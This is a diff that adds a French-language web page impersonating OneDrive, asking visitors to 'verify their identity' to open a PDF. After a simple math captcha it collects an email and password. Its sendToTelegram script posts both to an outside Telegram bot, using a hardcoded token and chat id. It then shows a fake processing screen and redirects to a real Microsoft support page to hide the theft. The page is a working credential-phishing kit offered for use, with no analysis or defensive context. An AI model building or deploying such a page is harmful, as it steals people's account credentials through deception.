@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vérifiez Votre Identité</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .header {
+      background: #0078d7;
+      padding: 12px 20px;
+      color: white;
+      display: flex;
+      align-items: center;
+    }
+    .header img {
+      height: 24px;
+      margin-right: 10px;
+    }
+    .wrapper {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 15px;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      border-radius: 10px;
+      padding: 30px 20px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .pdf-info {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: bold;
+      margin-bottom: 12px;
+    }
+    .pdf-info img {
+      height: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+    }
+    button {
+      background: #0078d7;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #005fa3;
+    }
+    .logos {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .logos img {
+      height: 26px;
+    }
+    .hidden {
+      display: none;
+    }
+    .final-message {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 15px;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 15px;
+      border: 1px solid #ffeeba;
+    }
+    .loading-spinner {
+      margin-top: 20px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0078d7;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 25px 15px;
+      }
+      .header span {
+        font-size: 16px;
+      }
+      input, button {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://i.ibb.co/ZRbmfGk5/Capture-d-cran-2025-07-16-013553.png" alt="OneDrive" />
+    <span>OneDrive</span>
+  </div>
+
+  <div class="wrapper">
+    <div class="container">
+      <h3>Vérifiez Votre Identité</h3>
+
+      <div class="pdf-info">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg" alt="PDF" />
+        <span>56.1KB PDF</span>
+      </div>
+
+      <p>Pour lire le document, entrez vos identifiants.</p>
+
+      <div class="logos">
+        <img src="https://i.ibb.co/1tfy0F94/Capture-d-cran-2025-07-16-010319.png"/>
+        <img src="https://i.ibb.co/q3GMgYXT/Capture-d-cran-2025-07-16-010433.png"/>
+        <img src="https://i.ibb.co/ZpCCPbgk/Capture-d-cran-2025-07-16-010507.png"/>
+        <img src="https://i.ibb.co/mVjHcyK2/Capture-d-cran-2025-07-16-010520.png"/>
+        <img src="https://i.ibb.co/qFcYqzhh/Capture-d-cran-2025-07-16-010617.png"/>
+        <img src="https://i.ibb.co/Q79kccfM/Capture-d-cran-2025-07-16-013006.png"/>
+        <img src="https://i.ibb.co/rKkzGhcZ/Capture-d-cran-2025-07-16-013030.png"/>
+      </div>
+
+      <div id="step1">
+        <p>Résolvez : <strong id="captcha"></strong></p>
+        <input type="text" id="captchaInput" placeholder="Résultat ?" />
+        <button onclick="checkCaptcha()">Valider</button>
+      </div>
+
+      <div id="step2" class="hidden">
+        <input type="email" id="email" placeholder="Entrez votre e-mail" />
+        <button onclick="showPassword()">Suivant</button>
+      </div>
+
+      <div id="step3" class="hidden">
+        <p style="margin-bottom: 0;"><strong id="displayedEmail"></strong></p>
+        <input type="password" id="password" placeholder="Entrez votre mot de passe" />
+        <button onclick="sendToTelegram()">Continuer</button>
+      </div>
+
+      <div id="loadingPage" class="hidden loading-spinner">
+        <div class="spinner"></div>
+        <p>Traitement en cours, veuillez patienter...</p>
+      </div>
+
+      <div id="finalMessage" class="hidden final-message">
+        ✅ Vos informations ont été prises en compte.<br />
+        ⏳ Le document vous sera envoyé dans un délai de 72 heures ouvrées.<br />
+        Merci de votre patience.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let a = Math.floor(Math.random() * 10);
+    let b = Math.floor(Math.random() * 10);
+    document.getElementById("captcha").innerText = `${a} + ${b} = ?`;
+
+    function checkCaptcha() {
+      const val = document.getElementById("captchaInput").value;
+      if (parseInt(val) === a + b) {
+        document.getElementById("step1").classList.add("hidden");
+        document.getElementById("step2").classList.remove("hidden");
+      } else {
+        alert("Captcha incorrect");
+      }
+    }
+
+    function showPassword() {
+      const email = document.getElementById("email").value;
+      if (!email.includes("@")) {
+        alert("Entrez un e-mail valide");
+        return;
+      }
+      document.getElementById("displayedEmail").innerText = `Compte : ${email}`;
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("step3").classList.remove("hidden");
+    }
+
+    function sendToTelegram() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const token = "6817181609:AAHSVSzpOGONPcsrodh6NXNauT4jJtNOvjs";
+      const chat_id = "-4280653674";
+      const message = `📥 Nouvelle soumission OneDrive\n\n📧 Email: ${email}\n🔐 Mot de passe: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+      .then(() => {
+        document.getElementById("step3").classList.add("hidden");
+        document.getElementById("loadingPage").classList.remove("hidden");
+
+        // Simule chargement pendant 3 secondes
+        setTimeout(() => {
+          document.getElementById("loadingPage").classList.add("hidden");
+          document.getElementById("finalMessage").classList.remove("hidden");
+
+          // Redirection après 5 secondes
+          setTimeout(() => {
+            window.location.href = "https://support.microsoft.com/fr-fr/office/couverture-prise-en-main-avec-onedrive-498739ec-8574-4439-9945-660a273966fa";
+          }, 5000);
+        }, 3000);
+      })
+      .catch(err => {
+        alert("Erreur d'envoi");
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html>
